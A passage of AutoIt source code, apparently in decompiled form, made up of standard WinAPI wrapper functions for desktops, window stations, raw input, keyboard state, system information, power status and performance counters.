            $acall = DllCall("user32.dll", "handle", "CreateDesktopExW", "wstr", $sname, "ptr", 0x0, "ptr", 0x0, "dword", $iflags, "dword", $iaccess, "struct*", $tsecurity, "ulong", $iheap, "ptr", 0x0)
        Else
            $acall = DllCall("user32.dll", "handle", "CreateDesktopW", "wstr", $sname, "ptr", 0x0, "ptr", 0x0, "dword", $iflags, "dword", $iaccess, "struct*", $tsecurity)
        EndIf
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateDesktop

    Func _WinAPI_CreateWindowStation($sname = '', $iaccess = 0x0, $iflags = 0x0, $tsecurity = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "CreateWindowStationW", "wstr", $sname, "dword", $iflags, "dword", $iaccess, "struct*", $tsecurity)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateWindowStation

    Func _WinAPI_DecompressBuffer($puncompressedbuffer, $iuncompressedsize, $pcompressedbuffer, $icompressedsize, $iformat = 0x2)
        Local $acall = DllCall("ntdll.dll", "long", "RtlDecompressBuffer", "ushort", $iformat, "struct*", $puncompressedbuffer, "ulong", $iuncompressedsize, "struct*", $pcompressedbuffer, "ulong", $icompressedsize, "ulong*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x6]
    EndFunc    ; -> _WinAPI_DecompressBuffer

    Func _WinAPI_DefRawInputProc($parawinput, $iinput)
        Local $acall = DllCall("user32.dll", "lresult", "DefRawInputProc", "ptr", $parawinput, "int", $iinput, "uint", DllStructGetSize(DllStructCreate($TAGRAWINPUTHEADER)))
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DefRawInputProc

    Func _WinAPI_EnumDesktops($hstation)
        If StringCompare(_WinAPI_GetUserObjectInformation($hstation, 0x3), "WindowStation") Then Return SetError(0x1, 0x0, 0x0)
        Local $henumproc = DllCallbackRegister("__EnumDefaultProc", "bool", "ptr;lparam")
        Dim $__g_venum[0x65] = [0x0]
        Local $acall = DllCall("user32.dll", "bool", "EnumDesktopsW", "handle", $hstation, "ptr", DllCallbackGetPtr($henumproc), "lparam", 0x0)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumDesktops

    Func _WinAPI_EnumDesktopWindows($hdesktop, $BVISIBLE = True)
        If StringCompare(_WinAPI_GetUserObjectInformation($hdesktop, 0x3), "Desktop") Then Return SetError(0x1, 0x0, 0x0)
        Local $henumproc = DllCallbackRegister("__EnumWindowsProc", "bool", "hwnd;lparam")
        Dim $__g_venum[0x65][0x2] = [[0x0]]
        Local $acall = DllCall("user32.dll", "bool", "EnumDesktopWindows", "handle", $hdesktop, "ptr", DllCallbackGetPtr($henumproc), "lparam", $BVISIBLE)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0][0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumDesktopWindows

    Func _WinAPI_EnumPageFiles()
        Local $ainfo = _WinAPI_GetSystemInfo()
        Local $henumproc = DllCallbackRegister("__EnumPageFilesProc", "bool", "lparam;ptr;ptr")
        Dim $__g_venum[0x65][0x4] = [[0x0]]
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "EnumPageFilesW", "ptr", DllCallbackGetPtr($henumproc), "lparam", $ainfo[0x1])
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0][0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumPageFiles

    Func _WinAPI_EnumRawInputDevices()
        Local Const $TAGRAWINPUTDEVICELIST = "struct;handle hDevice;dword Type;endstruct"
        Local $tridl, $ilength = DllStructGetSize(DllStructCreate($TAGRAWINPUTDEVICELIST))
        Local $acall = DllCall("user32.dll", "uint", "GetRawInputDeviceList", "ptr", 0x0, "uint*", 0x0, "uint", $ilength)
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        If ($acall[0x0] = -1) Or (Not $acall[0x2]) Then Return SetError(0xa, + -1, 0x0)
        Local $tdata = DllStructCreate("byte[" & ($acall[0x2] * $ilength) & "]")
        Local $pdata = DllStructGetPtr($tdata)
        If @error Then Return SetError(@error + 0x14, 0x0, 0x0)
        $acall = DllCall("user32.dll", "uint", "GetRawInputDeviceList", "ptr", $pdata, "uint*", $acall[0x2], "uint", $ilength)
        If ($acall[0x0] = -1) Or (Not $acall[0x0]) Then Return SetError(0x1, + -1, 0x0)
        Local $aret[$acall[0x2] + 0x1][0x2] = [[$acall[0x2]]]
        For $i = 0x1 To $acall[0x2]
            $tridl = DllStructCreate("ptr;dword", $pdata + $ilength * ($i + -1))
            For $j = 0x0 To 0x1
                $aret[$i][$j] = DllStructGetData($tridl, $j + 0x1)
            Next
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_EnumRawInputDevices

    Func _WinAPI_EnumWindowStations()
        Local $henumproc = DllCallbackRegister("__EnumDefaultProc", "bool", "ptr;lparam")
        Dim $__g_venum[0x65] = [0x0]
        Local $acall = DllCall("user32.dll", "bool", "EnumWindowStationsW", "ptr", DllCallbackGetPtr($henumproc), "lparam", 0x0)
        If @error Or Not $acall[0x0] Or Not $__g_venum[0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumWindowStations

    Func _WinAPI_ExpandEnvironmentStrings($sstring)
        Local $acall = DllCall("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $sstring, "wstr", '', "dword", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_ExpandEnvironmentStrings

    Func _WinAPI_GetActiveWindow()
        Local $acall = DllCall("user32.dll", "hwnd", "GetActiveWindow")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetActiveWindow

    Func _WinAPI_GetAsyncKeyState($ikey)
        Local $acall = DllCall("user32.dll", "short", "GetAsyncKeyState", "int", $ikey)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetAsyncKeyState

    Func _WinAPI_GetClipboardSequenceNumber()
        Local $acall = DllCall("user32.dll", "dword", "GetClipboardSequenceNumber")
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetClipboardSequenceNumber

    Func _WinAPI_GetCurrentHwProfile()
        Local $taghw_profile_info = "dword DockInfo;wchar szHwProfileGuid[39];wchar szHwProfileName[80]"
        Local $thwpi = DllStructCreate($taghw_profile_info)
        Local $acall = DllCall("advapi32.dll", "bool", "GetCurrentHwProfileW", "struct*", $thwpi)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x3]
        For $i = 0x0 To 0x2
            $aret[$i] = DllStructGetData($thwpi, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetCurrentHwProfile

    Func _WinAPI_GetDefaultPrinter()
        Local $acall = DllCall("winspool.drv", "bool", "GetDefaultPrinterW", "wstr", '', "dword*", 0x800)
        If @error Then Return SetError(@error, @extended, '')
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetDefaultPrinter

    Func _WinAPI_GetDllDirectory()
        Local $acall = DllCall("kernel32.dll", "dword", "GetDllDirectoryW", "dword", 0x1000, "wstr", '')
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetDllDirectory

    Func _WinAPI_GetEffectiveClientRect($hwnd, $actrl, $ISTART = 0x0, $IEND = + -1)
        If Not IsArray($actrl) Then
            Local $ictrl = $actrl
            Dim $actrl[0x1] = [$ictrl]
            $ISTART = 0x0
            $IEND = 0x0
        EndIf
        If __CheckErrorArrayBounds($actrl, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $icount = $IEND - $ISTART + 0x1
        Local $tctrl = DllStructCreate("uint64[" & ($icount + 0x2) & "]")
        $icount = 0x2
        For $i = $ISTART To $IEND
            If IsHWnd($actrl[$i]) Then
                $actrl[$i] = _WinAPI_GetDlgCtrlID($actrl[$i])
            EndIf
            DllStructSetData($tctrl, 0x1, _WinAPI_MakeQWord(0x1, $actrl[$i]), $icount)
            $icount += 0x1
        Next
        Local $trect = DllStructCreate($TAGRECT)
        DllCall("comctl32.dll", "none", "GetEffectiveClientRect", "hwnd", $hwnd, "struct*", $trect, "struct*", $tctrl)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetEffectiveClientRect

    Func _WinAPI_GetHandleInformation($hobject)
        Local $acall = DllCall("kernel32.dll", "bool", "GetHandleInformation", "handle", $hobject, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetHandleInformation

    Func _WinAPI_GetIdleTime()
        Local $tlastinputinfo = DllStructCreate("uint;dword")
        DllStructSetData($tlastinputinfo, 0x1, DllStructGetSize($tlastinputinfo))
        Local $acall = DllCall("user32.dll", "bool", "GetLastInputInfo", "struct*", $tlastinputinfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return _WinAPI_GetTickCount() - DllStructGetData($tlastinputinfo, 0x2)
    EndFunc    ; -> _WinAPI_GetIdleTime

    Func _WinAPI_GetKeyboardLayout($hwnd)
        Local $acall = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        $acall = DllCall("user32.dll", "handle", "GetKeyboardLayout", "dword", $acall[0x0])
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetKeyboardLayout

    Func _WinAPI_GetKeyboardLayoutList()
        Local $acall = DllCall("user32.dll", "uint", "GetKeyboardLayoutList", "int", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tdata = DllStructCreate("handle[" & $acall[0x0] & "]")
        $acall = DllCall("user32.dll", "uint", "GetKeyboardLayoutList", "int", $acall[0x0], "struct*", $tdata)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $alist[$acall[0x0] + 0x1] = [$acall[0x0]]
        For $i = 0x1 To $alist[0x0]
            $alist[$i] = DllStructGetData($tdata, 0x1, $i)
        Next
        Return $alist
    EndFunc    ; -> _WinAPI_GetKeyboardLayoutList

    Func _WinAPI_GetKeyboardState()
        Local $tdata = DllStructCreate("byte[256]")
        Local $acall = DllCall("user32.dll", "bool", "GetKeyboardState", "struct*", $tdata)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tdata
    EndFunc    ; -> _WinAPI_GetKeyboardState

    Func _WinAPI_GetKeyboardType($itype)
        Local $acall = DllCall("user32.dll", "int", "GetKeyboardType", "int", $itype)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetKeyboardType

    Func _WinAPI_GetKeyNameText($lparam)
        Local $acall = DllCall("user32.dll", "int", "GetKeyNameTextW", "long", $lparam, "wstr", '', "int", 0x80)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetKeyNameText

    Func _WinAPI_GetKeyState($vkey)
        Local $acall = DllCall("user32.dll", "short", "GetKeyState", "int", $vkey)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetKeyState

    Func _WinAPI_GetModuleHandleEx($smodule, $iflags = 0x0)
        If StringStripWS($smodule, $STR_STRIPLEADING + $STR_STRIPTRAILING) = '' Then $smodule = Null
        Local $acall = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", $iflags, "wstr", $smodule, "ptr*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetModuleHandleEx

    Func _WinAPI_GetMUILanguage()
        Local $acall = DllCall("comctl32.dll", "word", "GetMUILanguage")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetMUILanguage

    Func _WinAPI_GetPerformanceInfo()
        Local $tpi = DllStructCreate("dword;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;dword;dword;dword")
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "GetPerformanceInfo", "struct*", $tpi, "dword", DllStructGetSize($tpi))
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0xd]
        For $i = 0x0 To 0xc
            $aret[$i] = DllStructGetData($tpi, $i + 0x2)
        Next
        For $i = 0x0 To 0x8
            $aret[$i]*= $aret[0x9]
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetPerformanceInfo

    Func _WinAPI_GetProcAddress($hmodule, $vname)
        Local $stype = "str"
        If IsNumber($vname) Then $stype = "word"
        Local $acall = DllCall("kernel32.dll", "ptr", "GetProcAddress", "handle", $hmodule, $stype, $vname)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetProcAddress

    Func _WinAPI_GetPhysicallyInstalledSystemMemory()
        Local $acall = DllCall("kernel32.dll", "bool", "GetPhysicallyInstalledSystemMemory", "uint64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetPhysicallyInstalledSystemMemory

    Func _WinAPI_GetProcessShutdownParameters()
        Local $acall = DllCall("kernel32.dll", "bool", "GetProcessShutdownParameters", "dword*", 0x0, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return SetExtended(Number(Not $acall[0x2]), $acall[0x1])
    EndFunc    ; -> _WinAPI_GetProcessShutdownParameters

    Func _WinAPI_GetProcessWindowStation()
        Local $acall = DllCall("user32.dll", "handle", "GetProcessWindowStation")
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetProcessWindowStation

    Func _WinAPI_GetPwrCapabilities()
        If Not __dll("powrprof.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $tspc = DllStructCreate("byte[18];byte[3];byte;byte[8];byte[2];ulong[6];ulong[5]")
        Local $acall = DllCall("powrprof.dll", "boolean", "GetPwrCapabilities", "struct*", $tspc)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x19]
        For $i = 0x0 To 0x11
            $aret[$i] = DllStructGetData($tspc, 0x1, $i + 0x1)
        Next
        $aret[0x12] = DllStructGetData($tspc, 0x3)
        For $i = 0x13 To 0x14
            $aret[$i] = DllStructGetData($tspc, 0x5, $i + -18)
        Next
        For $i = 0x15 To 0x18
            $aret[$i] = DllStructGetData($tspc, 0x7, $i + -20)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetPwrCapabilities

    Func _WinAPI_GetRawInputBuffer($pbuffer, $ilength)
        Local $acall = DllCall("user32.dll", "uint", "GetRawInputBuffer", "struct*", $pbuffer, "uint*", $ilength, "uint", DllStructGetSize(DllStructCreate($TAGRAWINPUTHEADER)))
        If @error Then Return SetError(@error, @extended, 0x0)
        If ($acall[0x0] = -1) Or (Not $acall[0x1]) Then Return SetError(0xa, + -1, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetRawInputBuffer

    Func _WinAPI_GetRawInputBufferLength()
        Local $acall = DllCall("user32.dll", "uint", "GetRawInputBuffer", "ptr", 0x0, "uint*", 0x0, "uint", DllStructGetSize(DllStructCreate($TAGRAWINPUTHEADER)))
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = -1 Then Return SetError(0xa, + -1, 0x0)
        Return $acall[0x2] * 0x8
    EndFunc    ; -> _WinAPI_GetRawInputBufferLength

    Func _WinAPI_GetRawInputData($hrawinput, $pbuffer, $ilength, $iflag)
        Local $acall = DllCall("user32.dll", "uint", "GetRawInputData", "handle", $hrawinput, "uint", $iflag, "struct*", $pbuffer, "uint*", $ilength, "uint", DllStructGetSize(DllStructCreate($TAGRAWINPUTHEADER)))
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = -1 Then Return SetError(0xa, + -1, 0x0)
        Return ($acall[0x3] ? $acall[0x0] : $acall[0x4])
    EndFunc    ; -> _WinAPI_GetRawInputData

    Func _WinAPI_GetRawInputDeviceInfo($hdevice, $pbuffer, $ilength, $iflag)
        Local $acall = DllCall("user32.dll", "uint", "GetRawInputDeviceInfoW", "handle", $hdevice, "uint", $iflag, "struct*", $pbuffer, "uint*", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = -1 Then Return SetError(0xa, + -1, 0x0)
        Return ($acall[0x3] ? $acall[0x0] : $acall[0x4])
    EndFunc    ; -> _WinAPI_GetRawInputDeviceInfo

    Func _WinAPI_GetRegisteredRawInputDevices($pbuffer, $ilength)
        Local $ilengthraw = DllStructGetSize(DllStructCreate($TAGRAWINPUTDEVICE))
        Local $acall = DllCall("user32.dll", "uint", "GetRegisteredRawInputDevices", "struct*", $pbuffer, "uint*", Floor($ilength / $ilengthraw), "uint", $ilengthraw)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = -1 Then
            Local $ilasterror = _WinAPI_GetLastError()
            If $ilasterror = 0x7a Then Return SetExtended($ilasterror, $acall[0x2] * $ilengthraw)
            Return SetError(0xa, $ilasterror, 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetRegisteredRawInputDevices

    Func _WinAPI_GetStartupInfo()
        Local $tsi = DllStructCreate($TAGSTARTUPINFO)
        DllCall("kernel32.dll", "none", "GetStartupInfoW", "struct*", $tsi)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $tsi
    EndFunc    ; -> _WinAPI_GetStartupInfo

    Func _WinAPI_GetSystemDEPPolicy()
        Local $acall = DllCall("kernel32.dll", "uint", "GetSystemDEPPolicy")
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetSystemDEPPolicy

    Func _WinAPI_GetSystemInfo()
        Local $sproc
        If _WinAPI_IsWow64Process() Then
            $sproc = "GetNativeSystemInfo"
        Else
            $sproc = "GetSystemInfo"
        EndIf
        Local Const $TAGSYSTEMINFO = "struct;word ProcessorArchitecture;word Reserved; endstruct;dword PageSize;" & "ptr MinimumApplicationAddress;ptr MaximumApplicationAddress;dword_ptr ActiveProcessorMask;dword NumberOfProcessors;" & "dword ProcessorType;dword AllocationGranularity;word ProcessorLevel;word ProcessorRevision"
        Local $tsysteminfo = DllStructCreate($TAGSYSTEMINFO)
        DllCall("kernel32.dll", "none", $sproc, "struct*", $tsysteminfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $aret[0xa]
        $aret[0x0] = DllStructGetData($tsysteminfo, 0x1)
        For $i = 0x1 To 0x9
            $aret[$i] = DllStructGetData($tsysteminfo, $i + 0x2)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetSystemInfo

    Func _WinAPI_GetSystemPowerStatus()
        Local $tagsystem_power_status = "byte ACLineStatus;byte BatteryFlag;byte BatteryLifePercent;byte Reserved1;" & "int BatteryLifeTime;int BatteryFullLifeTime"
        Local $tsystem_power_status = DllStructCreate($tagsystem_power_status)
        Local $acall = DllCall("kernel32.dll", "bool", "GetSystemPowerStatus", "struct*", $tsystem_power_status)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x5]
        $aret[0x0] = DllStructGetData($tsystem_power_status, 0x1)
        $aret[0x1] = DllStructGetData($tsystem_power_status, 0x2)
        $aret[0x2] = DllStructGetData($tsystem_power_status, 0x3)
        $aret[0x3] = DllStructGetData($tsystem_power_status, 0x5)
        $aret[0x4] = DllStructGetData($tsystem_power_status, 0x6)
        Return $aret
    EndFunc    ; -> _WinAPI_GetSystemPowerStatus

    Func _WinAPI_GetSystemTimes()
        Local $acall = DllCall("kernel32.dll", "bool", "GetSystemTimes", "uint64*", 0x0, "uint64*", 0x0, "uint64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x3]
        For $i = 0x0 To 0x2
            $aret[$i] = $acall[$i + 0x1]
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetSystemTimes

    Func _WinAPI_GetSystemWow64Directory()
        Local $acall = DllCall("kernel32.dll", "uint", "GetSystemWow64DirectoryW", "wstr", '', "uint", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, _WinAPI_GetLastError(), '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetSystemWow64Directory

    Func _WinAPI_GetTickCount()
        Local $acall = DllCall("kernel32.dll", "dword", "GetTickCount")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetTickCount

    Func _WinAPI_GetTickCount64()
        Local $acall = DllCall("kernel32.dll", "uint64", "GetTickCount64")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetTickCount64

    Func _WinAPI_GetUserObjectInformation($hobject, $iindex)
        Local $acall = DllCall("user32.dll", "bool", "GetUserObjectInformationW", "handle", $hobject, "int", $iindex, "ptr", 0x0, "dword", 0x0, "dword*", 0x0)
        If @error Or Not $acall[0x5] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tdata
        Switch $iindex
        Case 0x1
            $tdata = DllStructCreate($TAGUSEROBJECTFLAGS)
        Case 0x5, 0x6
            $tdata = DllStructCreate("uint")
        Case 0x2, 0x3
            $tdata = DllStructCreate("wchar[" & $acall[0x5] & "]")
        Case 0x4
            $tdata = DllStructCreate("byte[" & $acall[0x5] & "]")
        Case Else
            Return SetError(0x14, 0x0, 0x0)
        EndSwitch
        $acall = DllCall("user32.dll", "bool", "GetUserObjectInformationW", "handle", $hobject, "int", $iindex, "struct*", $tdata, "dword", DllStructGetSize($tdata), "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x1e, @extended, 0x0)
        Switch $iindex
        Case 0x1, 0x4
            Return $tdata
        Case Else
            Return DllStructGetData($tdata, 0x1)
        EndSwitch
    EndFunc    ; -> _WinAPI_GetUserObjectInformation

    Func _WinAPI_GetVersionEx()
        Local $tosversioninfoex = DllStructCreate($TAGOSVERSIONINFOEX)
        DllStructSetData($tosversioninfoex, "OSVersionInfoSize", DllStructGetSize($tosversioninfoex))
        Local $acall = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosversioninfoex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tosversioninfoex
    EndFunc    ; -> _WinAPI_GetVersionEx

    Func _WinAPI_GetWorkArea()
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "int", "SystemParametersInfo", "uint", 0x30, "uint", 0x0, "struct*", $trect, "uint", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetWorkArea

    Func _WinAPI_InitMUILanguage($ilanguage)
        DllCall("comctl32.dll", "none", "InitMUILanguage", "word", $ilanguage)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_InitMUILanguage

    Func _WinAPI_IsLoadKBLayout($ilanguage)
        Local $alayout = _WinAPI_GetKeyboardLayoutList()
        If @error Then Return SetError(@error, @extended, False)
        For $i = 0x1 To $alayout[0x0]
            If $alayout[$i] = $ilanguage Then Return True
        Next
        Return False
    EndFunc    ; -> _WinAPI_IsLoadKBLayout

    Func _WinAPI_IsProcessorFeaturePresent($ifeature)
        Local $acall = DllCall("kernel32.dll", "bool", "IsProcessorFeaturePresent", "dword", $ifeature)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsProcessorFeaturePresent

    Func _WinAPI_IsWindowEnabled($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsWindowEnabled", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsWindowEnabled

    Func _WinAPI_Keybd_Event($vkey, $iflags, $iscancode = 0x0, $iextrainfo = 0x0)
        DllCall("user32.dll", "none", "keybd_event", "byte", $vkey, "byte", $iscancode, "dword", $iflags, "ulong_ptr", $iextrainfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_Keybd_Event

    Func _WinAPI_LoadKeyboardLayout($ilanguage, $iflag = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "LoadKeyboardLayoutW", "wstr", Hex($ilanguage, 0x8), "uint", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadKeyboardLayout

    Func _WinAPI_LockWorkStation()
        Local $acall = DllCall("user32.dll", "bool", "LockWorkStation")
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LockWorkStation

    Func _WinAPI_MapVirtualKey($icode, $itype, $hlocale = 0x0)
        Local $acall = DllCall("user32.dll", "INT", "MapVirtualKeyExW", "uint", $icode, "uint", $itype, "uint_ptr", $hlocale)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MapVirtualKey

    Func _WinAPI_Mouse_Event($iflags, $ix = 0x0, $iy = 0x0, $idata = 0x0, $iextrainfo = 0x0)
        DllCall("user32.dll", "none", "mouse_event", "dword", $iflags, "dword", $ix, "dword", $iy, "dword", $idata, "ulong_ptr", $iextrainfo)
        If @error Then Return SetError(@error, @extended)
    EndFunc    ; -> _WinAPI_Mouse_Event

    Func _WinAPI_OpenDesktop($sname, $iaccess = 0x0, $iflags = 0x0, $binherit = False)
        Local $acall = DllCall("user32.dll", "handle", "OpenDesktopW", "wstr", $sname, "dword", $iflags, "bool", $binherit, "dword", $iaccess)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenDesktop

    Func _WinAPI_OpenInputDesktop($iaccess = 0x0, $iflags = 0x0, $binherit = False)
        Local $acall = DllCall("user32.dll", "handle", "OpenInputDesktop", "dword", $iflags, "bool", $binherit, "dword", $iaccess)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenInputDesktop

    Func _WinAPI_OpenWindowStation($sname, $iaccess = 0x0, $binherit = False)
        Local $acall = DllCall("user32.dll", "handle", "OpenWindowStationW", "wstr", $sname, "bool", $binherit, "dword", $iaccess)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenWindowStation

    Func _WinAPI_QueryPerformanceCounter()
        Local $acall = DllCall("kernel32.dll", "bool", "QueryPerformanceCounter", "int64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_QueryPerformanceCounter

    Func _WinAPI_QueryPerformanceFrequency()
        Local $acall = DllCall("kernel32.dll", "bool", "QueryPerformanceFrequency", "int64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_QueryPerformanceFrequency

    Func _WinAPI_RegisterHotKey($hwnd, $iid, $imodifiers, $vkey)
        Local $acall = DllCall("user32.dll", "bool", "RegisterHotKey", "hwnd", $hwnd, "int", $iid, "uint", $imodifiers, "uint", $vkey)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterHotKey

    Func _WinAPI_RegisterPowerSettingNotification($hwnd, $sguid)
        Local $tguid = DllStructCreate($TAGGUID)
